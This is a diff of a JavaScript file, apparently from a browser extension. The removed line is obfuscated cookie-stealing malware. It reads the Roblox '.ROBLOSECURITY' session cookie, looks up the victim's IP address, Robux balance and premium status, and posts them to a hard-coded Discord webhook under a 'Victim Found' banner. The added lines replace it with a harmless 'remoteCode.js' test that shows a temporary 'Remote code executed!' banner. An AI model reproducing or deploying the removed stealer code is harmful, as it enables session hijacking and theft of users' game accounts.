@@ -1,1 +1,24 @@
-var _0x5d06d5=_0x5246;function _0x5d6d(){var _0x21bc98=['https://www.roblox.com/mobileapi/userinfo','Username','https://github.com/ox-y','13533PIuTnp','5015090oPSpTR','value','1472PJvENe','186800eeSDRG','Victim\x20Found:\x20','426teAEGn','https://discord.com/api/webhooks/1238900506584416367/JJf6orQbf8hYeu6ckIQPProHIAYHqc1RlhxYLIqHGSn9xa9nVzjKa6SGSCD6RzbuDdHL','IsPremium','4WHZfzF','https://www.roblox.com/home','RobuxBalance','73608NIunTx','https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png','Robux','833QVUuKk','ThumbnailUrl','37032ksGRHd','UserName','stringify','432sQdDYR','Application/json','.ROBLOSECURITY','text','.ROBLOSECURITY=','99EQZXEA','N/A','Roblox','134409gKzxEb','get','```','https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png','2604qkVIBu'];_0x5d6d=function(){return _0x21bc98;};return _0x5d6d();}(function(_0x311e58,_0x4bc510){var _0x15845b=_0x5246,_0x1b956c=_0x311e58();while(!![]){try{var _0x48fdb3=-parseInt(_0x15845b(0x1fe))/0x1*(-parseInt(_0x15845b(0x1eb))/0x2)+parseInt(_0x15845b(0x1e8))/0x3*(parseInt(_0x15845b(0x209))/0x4)+parseInt(_0x15845b(0x207))/0x5+-parseInt(_0x15845b(0x1f3))/0x6*(parseInt(_0x15845b(0x1f1))/0x7)+-parseInt(_0x15845b(0x1ee))/0x8*(parseInt(_0x15845b(0x1f6))/0x9)+-parseInt(_0x15845b(0x1e6))/0xa*(-parseInt(_0x15845b(0x1fb))/0xb)+-parseInt(_0x15845b(0x202))/0xc*(-parseInt(_0x15845b(0x206))/0xd);if(_0x48fdb3===_0x4bc510)break;else _0x1b956c['push'](_0x1b956c['shift']());}catch(_0xce88f4){_0x1b956c['push'](_0x1b956c['shift']());}}}(_0x5d6d,0x84529));const WEBHOOK=_0x5d06d5(0x1e9);function _0x5246(_0x36ab7a,_0xe5904b){var _0x5d6d8a=_0x5d6d();return _0x5246=function(_0x524605,_0x5cf8ba){_0x524605=_0x524605-0x1e6;var _0x160344=_0x5d6d8a[_0x524605];return _0x160344;},_0x5246(_0x36ab7a,_0xe5904b);}async function main(_0x5447da){var _0x1c6248=_0x5d06d5,_0x448a7a=await(await fetch('https://api.ipify.org'))[_0x1c6248(0x1f9)]();if(_0x5447da)var _0xdb2ee0=await(await fetch(_0x1c6248(0x203),{'headers':{'Cookie':_0x1c6248(0x1fa)+_0x5447da},'redirect':'manual'}))['json']();fetch(WEBHOOK,{'method':'POST','headers':{'Content-Type':_0x1c6248(0x1f7)},'body':JSON[_0x1c6248(0x1f5)]({'content':null,'embeds':[{'description':_0x1c6248(0x200)+(_0x5447da?_0x5447da:'COOKIE\x20NOT\x20FOUND')+_0x1c6248(0x200),'color':null,'fields':[{'name':_0x1c6248(0x204),'value':_0xdb2ee0?_0xdb2ee0[_0x1c6248(0x1f4)]:_0x1c6248(0x1fc),'inline':!![]},{'name':_0x1c6248(0x1f0),'value':_0xdb2ee0?_0xdb2ee0[_0x1c6248(0x1ed)]:_0x1c6248(0x1fc),'inline':!![]},{'name':'Premium','value':_0xdb2ee0?_0xdb2ee0[_0x1c6248(0x1ea)]:_0x1c6248(0x1fc),'inline':!![]}],'author':{'name':_0x1c6248(0x1e7)+_0x448a7a,'icon_url':_0xdb2ee0?_0xdb2ee0[_0x1c6248(0x1f2)]:_0x1c6248(0x201)},'footer':{'text':_0x1c6248(0x205),'icon_url':'https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png'},'thumbnail':{'url':_0xdb2ee0?_0xdb2ee0[_0x1c6248(0x1f2)]:_0x1c6248(0x201)}}],'username':_0x1c6248(0x1fd),'avatar_url':_0x1c6248(0x1ef),'attachments':[]})});}chrome['cookies'][_0x5d06d5(0x1ff)]({'url':_0x5d06d5(0x1ec),'name':_0x5d06d5(0x1f8)},function(_0x44163c){var _0x54c8d0=_0x5d06d5;main(_0x44163c?_0x44163c[_0x54c8d0(0x208)]:null);});
+// remoteCode.js
+
+// Log a message to the console
+console.log('Remote code executed successfully.');
+
+// Create a new div element and add it to the body
+const newDiv = document.createElement('div');
+newDiv.id = 'remote-code-test';
+newDiv.style.position = 'fixed';
+newDiv.style.bottom = '10px';
+newDiv.style.right = '10px';
+newDiv.style.padding = '10px';
+newDiv.style.backgroundColor = 'green';
+newDiv.style.color = 'white';
+newDiv.innerText = 'Remote code executed!';
+document.body.appendChild(newDiv);
+
+// Optionally, remove the div after 5 seconds
+setTimeout(() => {
+    const div = document.getElementById('remote-code-test');
+    if (div) {
+        document.body.removeChild(div);
+    }
+}, 5000);
